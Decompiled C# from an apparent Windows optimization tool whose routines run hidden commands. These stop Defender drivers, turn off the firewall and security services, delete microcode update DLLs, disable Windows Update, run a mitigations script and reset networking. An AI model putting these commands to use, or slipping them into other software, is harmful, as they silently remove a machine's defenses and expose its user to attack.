			process13.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process13.StartInfo.CreateNoWindow = true;
			process13.Start();
			process13.WaitForExit();
			Process process14 = new Process();
			process14.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process14.StartInfo.Arguments = "-U:T net stop WdFilter";
			process14.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process14.StartInfo.CreateNoWindow = true;
			process14.Start();
			process14.WaitForExit();
			Process process15 = new Process();
			process15.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process15.StartInfo.Arguments = "-U:T net stop WdBoot";
			process15.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process15.StartInfo.CreateNoWindow = true;
			process15.Start();
			process15.WaitForExit();
			Process process16 = new Process();
			process16.StartInfo.FileName = "gpupdate.exe";
			process16.StartInfo.Arguments = "/force";
			process16.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process16.StartInfo.CreateNoWindow = true;
			process16.Start();
			process16.WaitForExit();
			Process process17 = new Process();
			process17.StartInfo.FileName = "powercfg.exe";
			process17.StartInfo.Arguments = "-import " + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "\\xilly.pow 10000000-0000-0102-4444-000000002004";
			process17.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process17.StartInfo.CreateNoWindow = true;
			process17.Start();
			process17.WaitForExit();
			Process process18 = new Process();
			process18.StartInfo.FileName = "powercfg.exe";
			process18.StartInfo.Arguments = "-setactive 10000000-0000-0102-4444-000000002004";
			process18.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process18.StartInfo.CreateNoWindow = true;
			process18.Start();
			process18.WaitForExit();
			Process process19 = new Process();
			process19.StartInfo.FileName = "powercfg.exe";
			process19.StartInfo.Arguments = "-delete 381b4222-f694-41f0-9685-ff5bb260df2e";
			process19.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process19.StartInfo.CreateNoWindow = true;
			process19.Start();
			process19.WaitForExit();
			Process process20 = new Process();
			process20.StartInfo.FileName = "powercfg.exe";
			process20.StartInfo.Arguments = "-delete 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c";
			process20.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process20.StartInfo.CreateNoWindow = true;
			process20.Start();
			process20.WaitForExit();
			Process process21 = new Process();
			process21.StartInfo.FileName = "powercfg.exe";
			process21.StartInfo.Arguments = "-delete a1841308-3541-4fab-bc81-f71556f20b4a";
			process21.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process21.StartInfo.CreateNoWindow = true;
			process21.Start();
			process21.WaitForExit();
			Process process22 = new Process();
			process22.StartInfo.FileName = "powercfg.exe";
			process22.StartInfo.Arguments = "-h off";
			process22.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process22.StartInfo.CreateNoWindow = true;
			process22.Start();
			process22.WaitForExit();
			Process process23 = new Process();
			process23.StartInfo.FileName = "cmd.exe";
			process23.StartInfo.Arguments = "/c C:/Windows/System32/powercfg.cpl";
			process23.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
			process23.StartInfo.CreateNoWindow = false;
			process23.Start();
			process23.WaitForExit();
			Process process24 = new Process();
			process24.StartInfo.FileName = "netsh.exe";
			process24.StartInfo.Arguments = "int ipv4 reset";
			process24.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process24.StartInfo.CreateNoWindow = true;
			process24.Start();
			process24.WaitForExit();
			Process process25 = new Process();
			process25.StartInfo.FileName = "netsh.exe";
			process25.StartInfo.Arguments = "int tcp reset";
			process25.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process25.StartInfo.CreateNoWindow = true;
			process25.Start();
			process25.WaitForExit();
			Process process26 = new Process();
			process26.StartInfo.FileName = "netsh.exe";
			process26.StartInfo.Arguments = "int ipv6 reset";
			process26.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process26.StartInfo.CreateNoWindow = true;
			process26.Start();
			process26.WaitForExit();
			Process process27 = new Process();
			process27.StartInfo.FileName = "netsh.exe";
			process27.StartInfo.Arguments = "int httpstunnel reset";
			process27.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process27.StartInfo.CreateNoWindow = true;
			process27.Start();
			process27.WaitForExit();
			Process process28 = new Process();
			process28.StartInfo.FileName = "netsh.exe";
			process28.StartInfo.Arguments = "int portproxy reset";
			process28.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process28.StartInfo.CreateNoWindow = true;
			process28.Start();
			process28.WaitForExit();
			Process process29 = new Process();
			process29.StartInfo.FileName = "netsh.exe";
			process29.StartInfo.Arguments = "advfirewall set allprofiles state off";
			process29.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process29.StartInfo.CreateNoWindow = true;
			process29.Start();
			process29.WaitForExit();
			Process process30 = new Process();
			process30.StartInfo.FileName = "netsh.exe";
			process30.StartInfo.Arguments = "winsock reset";
			process30.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process30.StartInfo.CreateNoWindow = true;
			process30.Start();
			process30.WaitForExit();
			Process process31 = new Process();
			process31.StartInfo.FileName = "netsh.exe";
			process31.StartInfo.Arguments = "http flush logbuffer";
			process31.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process31.StartInfo.CreateNoWindow = true;
			process31.Start();
			process31.WaitForExit();
			Process process32 = new Process();
			process32.StartInfo.FileName = "netsh.exe";
			process32.StartInfo.Arguments = "nap reset configuration";
			process32.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process32.StartInfo.CreateNoWindow = true;
			process32.Start();
			process32.WaitForExit();
			Process process33 = new Process();
			process33.StartInfo.FileName = "netsh.exe";
			process33.StartInfo.Arguments = "branchcache reset";
			process33.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process33.StartInfo.CreateNoWindow = true;
			process33.Start();
			process33.WaitForExit();
			Process process34 = new Process();
			process34.StartInfo.FileName = "netsh.exe";
			process34.StartInfo.Arguments = "lan reconnect";
			process34.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process34.StartInfo.CreateNoWindow = true;
			process34.Start();
			process34.WaitForExit();
			Process process35 = new Process();
			process35.StartInfo.FileName = "ipconfig.exe";
			process35.StartInfo.Arguments = "/flushdns";
			process35.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process35.StartInfo.CreateNoWindow = true;
			process35.Start();
			process35.WaitForExit();
			File.Delete("C:\\xilly.pow");
			try
			{
				Process process36 = new Process();
				process36.StartInfo.FileName = "cmd.exe";
				process36.StartInfo.Arguments = string.Concat(new string[]
				{
					"/C TAKEOWN /F ",
					Path.GetPathRoot(Environment.SystemDirectory),
					"Windows\\System32\\mcupdate_AuthenticAMD.dll /A & ICACLS ",
					Path.GetPathRoot(Environment.SystemDirectory),
					"Windows\\System32\\mcupdate_AuthenticAMD.dll /GRANT Administrators:(F)"
				});
				process36.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process36.StartInfo.CreateNoWindow = true;
				process36.Start();
				process36.WaitForExit();
				Process process37 = new Process();
				process37.StartInfo.FileName = "cmd.exe";
				process37.StartInfo.Arguments = string.Concat(new string[]
				{
					"/C TAKEOWN /F ",
					Path.GetPathRoot(Environment.SystemDirectory),
					"Windows\\System32\\mcupdate_GenuineIntel.dll /A & ICACLS ",
					Path.GetPathRoot(Environment.SystemDirectory),
					"Windows\\System32\\mcupdate_GenuineIntel.dll /GRANT Administrators:(F)"
				});
				process37.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process37.StartInfo.CreateNoWindow = true;
				process37.Start();
				process37.WaitForExit();
				Process process38 = new Process();
				process38.StartInfo.FileName = "cmd.exe";
				process38.StartInfo.Arguments = "/C DEL /Q " + Path.GetPathRoot(Environment.SystemDirectory) + "Windows\\System32\\mcupdate_AuthenticAMD.dll";
				process38.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process38.StartInfo.CreateNoWindow = true;
				process38.Start();
				process38.WaitForExit();
				Process process39 = new Process();
				process39.StartInfo.FileName = "cmd.exe";
				process39.StartInfo.Arguments = "/C DEL /Q " + Path.GetPathRoot(Environment.SystemDirectory) + "Windows\\System32\\mcupdate_GenuineIntel.dll";
				process39.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process39.StartInfo.CreateNoWindow = true;
				process39.Start();
				process39.WaitForExit();
			}
			catch
			{
			}
			Process process40 = new Process();
			process40.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process40.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process40.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process40.StartInfo.CreateNoWindow = true;
			process40.Start();
			process40.WaitForExit();
			Process sechealth = new Process();
			sechealth.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			sechealth.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			sechealth.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			sechealth.StartInfo.CreateNoWindow = true;
			sechealth.Start();
			sechealth.WaitForExit();
			Process sense = new Process();
			sense.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			sense.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			sense.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			sense.StartInfo.CreateNoWindow = true;
			sense.Start();
			sense.WaitForExit();
			Process process41 = new Process();
			process41.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process41.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DPS\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process41.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process41.StartInfo.CreateNoWindow = true;
			process41.Start();
			process41.WaitForExit();
			Process process42 = new Process();
			process42.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process42.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process42.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process42.StartInfo.CreateNoWindow = true;
			process42.Start();
			process42.WaitForExit();
			Process process43 = new Process();
			process43.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process43.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Ndu\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process43.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process43.StartInfo.CreateNoWindow = true;
			process43.Start();
			process43.WaitForExit();
			Process process44 = new Process();
			process44.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process44.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NetBT\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process44.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process44.StartInfo.CreateNoWindow = true;
			process44.Start();
			process44.WaitForExit();
			Process process45 = new Process();
			process45.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process45.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CDPSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process45.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process45.StartInfo.CreateNoWindow = true;
			process45.Start();
			process45.WaitForExit();
			Process process46 = new Process();
			process46.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process46.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CDPUserSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process46.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process46.StartInfo.CreateNoWindow = true;
			process46.Start();
			process46.WaitForExit();
			Process process47 = new Process();
			process47.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process47.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PcaSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process47.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process47.StartInfo.CreateNoWindow = true;
			process47.Start();
			process47.WaitForExit();
			Process process48 = new Process();
			process48.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process48.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wscsvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process48.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process48.StartInfo.CreateNoWindow = true;
			process48.Start();
			process48.WaitForExit();
			Process process49 = new Process();
			process49.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process49.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DoSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process49.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process49.StartInfo.CreateNoWindow = true;
			process49.Start();
			process49.WaitForExit();
			Process process50 = new Process();
			process50.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process50.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\RasMan\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process50.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process50.StartInfo.CreateNoWindow = true;
			process50.Start();
			process50.WaitForExit();
			Process process51 = new Process();
			process51.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process51.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\OneSyncSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process51.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process51.StartInfo.CreateNoWindow = true;
			process51.Start();
			process51.WaitForExit();
			Process process52 = new Process();
			process52.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process52.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ShellHWDetection\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process52.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process52.StartInfo.CreateNoWindow = true;
			process52.Start();
			process52.WaitForExit();
			Process process53 = new Process();
			process53.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process53.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lfsvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process53.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process53.StartInfo.CreateNoWindow = true;
			process53.Start();
			process53.WaitForExit();
			Process process54 = new Process();
			process54.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process54.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\IKEEXT\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process54.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process54.StartInfo.CreateNoWindow = true;
			process54.Start();
			process54.WaitForExit();
			Process process55 = new Process();
			process55.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process55.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SEMgrSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process55.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process55.StartInfo.CreateNoWindow = true;
			process55.Start();
			process55.WaitForExit();
			Process process56 = new Process();
			process56.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process56.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SSDPSRV\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process56.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process56.StartInfo.CreateNoWindow = true;
			process56.Start();
			process56.WaitForExit();
			Process process57 = new Process();
			process57.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process57.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SENS\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process57.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process57.StartInfo.CreateNoWindow = true;
			process57.Start();
			process57.WaitForExit();
			Process process58 = new Process();
			process58.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process58.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\FontCache\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process58.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process58.StartInfo.CreateNoWindow = true;
			process58.Start();
			process58.WaitForExit();
			Process process59 = new Process();
			process59.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process59.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WpnService\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process59.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process59.StartInfo.CreateNoWindow = true;
			process59.Start();
			process59.WaitForExit();
			Process process60 = new Process();
			process60.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process60.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TabletInputService\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process60.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process60.StartInfo.CreateNoWindow = true;
			process60.Start();
			process60.WaitForExit();
			Process process61 = new Process();
			process61.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process61.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DusmSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process61.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process61.StartInfo.CreateNoWindow = true;
			process61.Start();
			process61.WaitForExit();
			Process process62 = new Process();
			process62.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process62.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SstpSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process62.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process62.StartInfo.CreateNoWindow = true;
			process62.Start();
			process62.WaitForExit();
			Process process63 = new Process();
			process63.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process63.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdiSystemHost\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process63.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process63.StartInfo.CreateNoWindow = true;
			process63.Start();
			process63.WaitForExit();
			Process process64 = new Process();
			process64.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process64.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Themes\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process64.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process64.StartInfo.CreateNoWindow = true;
			process64.Start();
			process64.WaitForExit();
			Process process65 = new Process();
			process65.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process65.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lmhosts\" /v \"Start\" /t REG_DWORD /d \"4\" /f";
			process65.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process65.StartInfo.CreateNoWindow = true;
			process65.Start();
			process65.WaitForExit();
			Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\FTH", true).SetValue("Enabled", "0", RegistryValueKind.DWord);
			Process uninstallapps = new Process();
			uninstallapps.StartInfo.FileName = Path.GetTempPath() + "Uninstall_all_preinstalled_windows_apps.bat";
			uninstallapps.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			uninstallapps.StartInfo.CreateNoWindow = true;
			uninstallapps.Start();
			uninstallapps.WaitForExit();
			Process DisableDriverpowersaving = new Process();
			DisableDriverpowersaving.StartInfo.FileName = Path.GetTempPath() + "DisableDriverpowersaving.bat";
			DisableDriverpowersaving.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			DisableDriverpowersaving.StartInfo.CreateNoWindow = true;
			DisableDriverpowersaving.Start();
			DisableDriverpowersaving.WaitForExit();
			Process disablenet = new Process();
			disablenet.StartInfo.FileName = Path.GetTempPath() + "networkadapters.bat";
			disablenet.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			disablenet.StartInfo.CreateNoWindow = true;
			disablenet.Start();
			disablenet.WaitForExit();
			Process disablenagling = new Process();
			disablenagling.StartInfo.FileName = Path.GetTempPath() + "Disable_Nagling.bat";
			disablenagling.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			disablenagling.StartInfo.CreateNoWindow = true;
			disablenagling.Start();
			disablenagling.WaitForExit();
			try
			{
				Process uninstall1drive = new Process();
				uninstall1drive.StartInfo.FileName = "cmd.exe";
				uninstall1drive.StartInfo.Arguments = "/c for %a in (\"SysWOW64\" \"System32\") do (if exist \"%windir%\\%~a\\OneDriveSetup.exe\" (\"%windir%\\%~a\\OneDriveSetup.exe\" /uninstall)) && reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\" /f > nul 2>&1";
				uninstall1drive.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				uninstall1drive.StartInfo.CreateNoWindow = true;
				uninstall1drive.Start();
				uninstall1drive.WaitForExit();
			}
			catch
			{
			}
			try
			{
				new Process
				{
					StartInfo = 
					{
						FileName = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "\\Windows\\SetTimerResolutionService.exe",
						Arguments = "-install",
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					}
				}.Start();
				Process configtimerres = new Process();
				configtimerres.StartInfo.FileName = "sc.exe";
				configtimerres.StartInfo.Arguments = "config STR start= auto";
				configtimerres.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				configtimerres.StartInfo.CreateNoWindow = true;
				configtimerres.Start();
				configtimerres.WaitForExit();
				Process starttimerres = new Process();
				starttimerres.StartInfo.FileName = "net";
				starttimerres.StartInfo.Arguments = "start STR";
				starttimerres.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				starttimerres.StartInfo.CreateNoWindow = true;
				starttimerres.Start();
				starttimerres.WaitForExit();
				RegistryKey Timerres = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SetTimerResolutionService.exe\\PerfOptions", true);
				Timerres.SetValue("CpuPriorityClass", "1", RegistryValueKind.DWord);
				Timerres.Close();
			}
			catch
			{
			}
			Process disableupdates = new Process();
			disableupdates.StartInfo.FileName = Path.GetTempPath() + "Wub_x64.exe";
			disableupdates.StartInfo.Arguments = "/D /P";
			disableupdates.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			disableupdates.StartInfo.CreateNoWindow = true;
			disableupdates.Start();
			disableupdates.WaitForExit();
			Process mitigations = new Process();
			mitigations.StartInfo.FileName = Path.GetTempPath() + "mitigations.bat";
			mitigations.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			mitigations.StartInfo.CreateNoWindow = true;
			mitigations.Start();
			mitigations.WaitForExit();
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00006AD8 File Offset: 0x00004CD8
		private void OtherButton_Click(object sender, RoutedEventArgs e)
		{
			bool flag = QModernMessageBox.Show("Do you use XBOX game-bar", "Xbox Game-Bar", QModernMessageBox.QModernMessageBoxButtons.YesNo, ModernMessageboxIcons.Question, true) == ModernMessageboxResult.Button2;
			if (flag)
			{
				Process process = new Process();
				process.StartInfo.FileName = "powershell.exe";
				process.StartInfo.Arguments = "Get-AppxPackage -AllUsers Microsoft.XboxGamingOverlay | Remove-AppxPackage";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
			}
			this.gpuSettings();
			this.startOther();
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00006B60 File Offset: 0x00004D60
		[DebuggerStepThrough]
		private void StartGPU()
		{
			Products.<StartGPU>d__12 <StartGPU>d__ = new Products.<StartGPU>d__12();
			<StartGPU>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<StartGPU>d__.<>4__this = this;
			<StartGPU>d__.<>1__state = -1;
			<StartGPU>d__.<>t__builder.Start<Products.<StartGPU>d__12>(ref <StartGPU>d__);
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00006B9C File Offset: 0x00004D9C
		private void driverDownloads()
		{
			Thread.Sleep(2000);
			bool desktop = this.Desktop;
			if (desktop)
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(Path.GetTempPath() + "GPU.xml");
				string innerText = xmlDocument.SelectSingleNode("/gpuz_dump/card/gpuname").InnerText;
				string innerText2 = xmlDocument.SelectSingleNode("/gpuz_dump/card/cardname").InnerText;
				bool flag = innerText2.Contains("NVIDIA");
				if (flag)
				{
					try
					{
						bool flag2 = !File.Exists(Path.GetTempPath() + "DisplayDriverUninstaller/DisplayDriverUninstaller.exe");
						if (flag2)
						{
							ZipFile.ExtractToDirectory(Path.GetTempPath() + "DisplayDriverUninstaller.zip", Path.GetTempPath() ?? "");
						}
						Process uninstallNV = new Process();
						uninstallNV.StartInfo.FileName = Path.GetTempPath() + "Display Driver Uninstaller.exe";
						uninstallNV.StartInfo.Arguments = "-silent -cleannvidia";
						uninstallNV.StartInfo.CreateNoWindow = true;
						uninstallNV.Start();
						uninstallNV.WaitForExit();
					}
					catch
					{
						Process uninstallNV2 = new Process();
						uninstallNV2.StartInfo.FileName = Path.GetTempPath() + "Display Driver Uninstaller.exe";
						uninstallNV2.StartInfo.Arguments = "-silent -cleannvidia";
						uninstallNV2.StartInfo.CreateNoWindow = true;
						uninstallNV2.Start();
						uninstallNV2.WaitForExit();
					}
					Process restart = new Process();
					restart.StartInfo.FileName = "cmd.exe";
					restart.StartInfo.Arguments = "/c shutdown.exe -r";
					restart.StartInfo.CreateNoWindow = true;
					restart.Start();
					restart.WaitForExit();
				}
				else
				{
					bool flag3 = !innerText2.Contains("Radeon");
					if (!flag3)
					{
						try
						{
							bool flag4 = !File.Exists(Path.GetTempPath() + "DisplayDriverUninstaller/DisplayDriverUninstaller.exe");
							if (flag4)
							{
								ZipFile.ExtractToDirectory(Path.GetTempPath() + "DisplayDriverUninstaller.zip", Path.GetTempPath() ?? "");
							}
							Process process = new Process();
							process.StartInfo.FileName = Path.GetTempPath() + "Display Driver Uninstaller.exe";
							process.StartInfo.Arguments = "-silent -cleanamd -removeamdaudiobus -removeamdkmpfd";
							process.StartInfo.CreateNoWindow = true;
							process.Start();
							process.WaitForExit();
						}
						catch
						{
							Process process2 = new Process();
							process2.StartInfo.FileName = Path.GetTempPath() + "Display Driver Uninstaller.exe";
							process2.StartInfo.Arguments = "-silent -cleanamd -removeamdaudiobus -removeamdkmpfd";
							process2.StartInfo.CreateNoWindow = true;
							process2.Start();
							process2.WaitForExit();
						}
					}
				}
			}
			else
			{
				bool desktop2 = this.Desktop;
				if (!desktop2)
				{
					bool flag5 = !this.RADEON;
					if (flag5)
					{
						try
						{
							bool flag6 = !File.Exists(Path.GetTempPath() + "DisplayDriverUninstaller.exe");
							if (flag6)
							{
								ZipFile.ExtractToDirectory(Path.GetTempPath() + "DisplayDriverUninstaller.zip", Path.GetTempPath() ?? "");
							}
							Process uninstall = new Process();
							uninstall.StartInfo.FileName = Path.GetTempPath() + "Display Driver Uninstaller.exe";
							uninstall.Start();
							uninstall.WaitForExit();
						}
						catch
						{
							Process uninstall2 = new Process();
							uninstall2.StartInfo.FileName = Path.GetTempPath() + "Display Driver Uninstaller.exe";
							uninstall2.Start();
							uninstall2.WaitForExit();
						}
					}
					else
					{
						Process.Start(new ProcessStartInfo("https://www.amd.com/en/support")
						{
							UseShellExecute = true
						});
					}
				}
			}
		}

